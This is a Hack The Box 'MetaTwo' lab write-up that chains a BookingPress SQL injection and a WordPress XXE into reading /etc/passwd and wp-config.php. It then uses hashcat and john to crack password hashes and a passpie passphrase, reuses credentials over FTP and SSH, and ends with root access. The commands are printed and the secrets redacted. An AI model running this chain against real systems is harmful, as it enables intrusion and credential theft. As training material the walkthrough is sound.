# HTB MetaTwo

## 1. Initial Enumeration

**Target:** `10.129.228.95`

The initial Nmap scan identified three open ports:

```
nmap -sC -sV -p21,22,80 10.129.228.95 --min-rate 1000 -oN nmap.txt
```

### Results

|Port|Service|Finding|
|---|---|---|
|21|FTP|FTP service; further enumeration required|
|22|SSH|OpenSSH 8.4p1 on Debian|
|80|HTTP|Nginx 1.18.0; redirects to `metapress.htb`|

The website was hosted on the `metapress.htb` virtual host. I added the hostname to `/etc/hosts` so the site could be accessed by name.

```
10.129.228.95 metapress.htb
```

Opening the website revealed a WordPress installation. The next step was to identify the WordPress version and installed plugins.

## 2. WordPress and Plugin Enumeration

The WordPress version was identified by inspecting the page source:

```
curl -s http://metapress.htb | grep -i 'ver'
```

The response revealed **WordPress 5.6.2**.

The `/events/` page exposed the BookingPress plugin and its version through the stylesheet URLs:

```
curl -s http://metapress.htb/events/ | grep -i plugins
```

Relevant result:

```
bookingpress-appointment-booking/...css?ver=1.0.10
```

The identified components were:

- **WordPress 5.6.2:** vulnerable to authenticated XXE under the conditions described by CVE-2021-29447.
    
- **BookingPress 1.0.10:** associated with the SQL injection vulnerability CVE-2022-0739.
    

These findings provided two potential avenues for further investigation.

## 3. BookingPress SQL Injection — Credential Discovery

I searched for a proof of concept for CVE-2022-0739 and found:

[BookingPress CVE-2022-0739 PoC — GitHub](https://github.com/viardant/CVE-2022-0739/blob/main/README.md)

The exploit was executed against the vulnerable site:

```
python3 exploit.py \
  -u http://metapress.htb \
  -nu http://metapress.htb/events/ \
  -a -o db_dump -payload
```

The exploit fingerprinted the database as MariaDB and retrieved WordPress user records.

The recovered accounts included:

- `admin`
    
- `manager`
    

The output contained their email addresses and password hashes. Those sensitive values have been redacted.

### Cracking the manager's password hash

The recovered manager hash was saved to `hash.txt` and tested with Hashcat:

```
hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

Hashcat identified the hash format as **phpass (mode 400)** and successfully recovered the manager's password.

**Recovered password:** `[REDACTED]`

## 4. Authenticated XXE in WordPress

With the recovered manager credentials, I investigated CVE-2021-29447, an authenticated XXE vulnerability affecting WordPress audio-file handling under specific conditions.

PoC used:

[WordPress CVE-2021-29447 PoC — GitHub](https://github.com/Val-Resh/CVE-2021-29447-POC/blob/main/CVE-2021-29447.py)

The exploit was run against the target:

```
sudo python3 poc2.py \
  --url http://metapress.htb \
  --server-ip 10.10.15.25 \
  -u manager \
  -p '[REDACTED]'
```

The PoC successfully authenticated, retrieved the upload nonce, generated a WAV payload containing an XXE, and started a listener for the external DTD.

### Reading `/etc/passwd`

The first file requested through the XXE was:

```
/etc/passwd
```

The exploit returned the file contents, revealing local system accounts, including:

```
jnelson:x:1000:1000:...:/home/jnelson:/bin/bash
www-data:x:33:33:...:/var/www:/usr/sbin/nologin
```

The `jnelson` account was particularly interesting because it had a home directory and a Bash login shell.

### Reading `wp-config.php`

The next request targeted the WordPress configuration file:

```
../wp-config.php
```

The XXE succeeded again and exposed configuration details, including:

- WordPress database name and username
    
- Database password — `[REDACTED]`
    
- FTP username — `[REDACTED]`
    
- FTP password — `[REDACTED]`
    
- FTP hostname and base directory
    

This was a significant breakthrough. The configuration file exposed credentials for services beyond the WordPress application.

## 5. FTP Enumeration with Recovered Credentials

The initial scan identified FTP on port 21, but anonymous access was unavailable. The credentials recovered from `wp-config.php` provided a way to authenticate.

Connected to the service:

```
ftp 10.129.228.95
```

After authenticating with the recovered FTP account, I enumerated the accessible directories.

```
blog/
mailer/
```

The `mailer` directory contained:

```
PHPMailer/
send_email.php
```

I downloaded the PHP script for offline inspection:

```
get send_email.php
```

### Inspecting `send_email.php`

The script contained PHPMailer configuration for an SMTP account:

```
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;
$mail->Username = "[REDACTED]";
$mail->Password = "[REDACTED]";
$mail->SMTPSecure = "tls";
$mail->Port = 587;
```

The configuration identified the account as belonging to `jnelson`.

This linked the SMTP credentials to the local `jnelson` account discovered earlier in `/etc/passwd`.

The credentials were therefore worth testing against the exposed SSH service.

## 6. SSH Access as `jnelson`

The target exposed SSH on port 22. I attempted to authenticate as `jnelson` using the password recovered from the mailer configuration.

```
ssh jnelson@10.129.228.95
```

Authentication succeeded, establishing an SSH session as `jnelson`.

The home directory contained `user.txt`:

```
ls
cat user.txt
```

## 7. Enumerating Stored Passwords with Passpie

After obtaining the SSH shell, I enumerated the available commands and discovered `passpie`.

Running it displayed stored credential entries:

```
passpie
```

The output showed entries for:

- SSH account `jnelson`
    
- SSH account `root`
    

The stored passwords were masked in the terminal output.

An attempt to export the credentials initially failed because the passphrase was incorrect:

```
passpie export ./creds
```

The error indicated that the supplied passphrase was not valid.

### Inspecting Passpie's files

I inspected the Passpie directory:

```
cd ~/.passpie
ls -la
```

The directory contained:

```
.config
.keys
ssh/
```

The `.keys` file contained the key material used by Passpie. This became the next focus of the investigation.

## 8. Cracking the Passpie GPG Passphrase

The private key material in `.keys` was used to generate a John the Ripper-compatible hash. The public-key entries were removed from a working copy before processing it.

The hash was generated with:

```
gpg2john keys > hash.txt
```

John the Ripper was then run against the extracted hash:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully recovered the Passpie passphrase.

**Passphrase:** `[REDACTED]`

This passphrase allowed the stored credentials to be exported.

```
passpie export ./cred.txt
```

The exported credential file contained entries for `jnelson` and `root`. Both stored password values have been redacted.

```
credentials:
  - fullname: root@ssh
    login: root
    password: '[REDACTED]'
  - fullname: jnelson@ssh
    login: jnelson
    password: '[REDACTED]'
```

The important finding was the stored password associated with the `root` SSH account.

## 9. Privilege Escalation to Root

The Passpie export revealed a password for the root account. Rather than exploiting a kernel vulnerability or a misconfigured SUID binary, I used the recovered credential to switch users.

```
su root
```

After entering the recovered root password, the shell changed to the root account.

```
cd ~
ls
```

The root directory contained `root.txt`.

```
cat root.txt
```

**Root flag:** `[REDACTED]`

This completed the privilege-escalation chain.
